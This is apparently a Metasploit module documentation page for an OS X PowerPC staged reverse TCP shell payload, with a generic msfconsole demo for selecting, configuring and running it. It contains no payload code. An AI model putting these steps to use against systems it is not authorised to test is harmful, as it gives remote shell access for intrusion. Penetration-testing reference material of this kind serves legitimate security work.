## OS X Command Shell, Reverse TCP Stager

Spawn a command shell (staged). Connect back to the attacker


## Module Name
payload/osx/ppc/shell/reverse_tcp

## Authors
* hdm





## Platforms
* osx

## Reliability
[Normal](https://github.com/rapid7/metasploit-framework/wiki/Exploit-Ranking)

## Demo

```
msf > use payload/osx/ppc/shell/reverse_tcp
msf payload(reverse_tcp) > show targets
   ... a list of targets ...
msf payload(reverse_tcp) > set TARGET <target-id>
msf payload(reverse_tcp) > show options
   ... show and set options ...
msf payload(reverse_tcp) > run
```
    
    